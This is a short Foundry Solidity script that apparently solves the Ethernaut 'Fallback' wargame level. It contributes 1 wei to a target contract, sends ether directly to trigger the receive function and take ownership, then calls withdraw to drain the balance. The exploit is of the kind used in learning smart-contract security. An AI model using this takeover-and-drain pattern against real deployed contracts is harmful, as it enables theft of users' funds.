// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Fallback } from "../src/Fallback.sol";

contract FallbackSolution is Script {
    function run() external {
        address instanceAddress = 0x23ab662427512676133c944318DAa44d7ebA94e9;
        
        vm.startBroadcast();
        
        Fallback target = Fallback(payable(instanceAddress));
        
        target.contribute{value: 1 wei}();
        
        (bool success,) = address(target).call{value: 1 wei}("");
        require(success);

        target.withdraw();

        console.log(address(target).balance);     
   
        vm.stopBroadcast();
    }
}
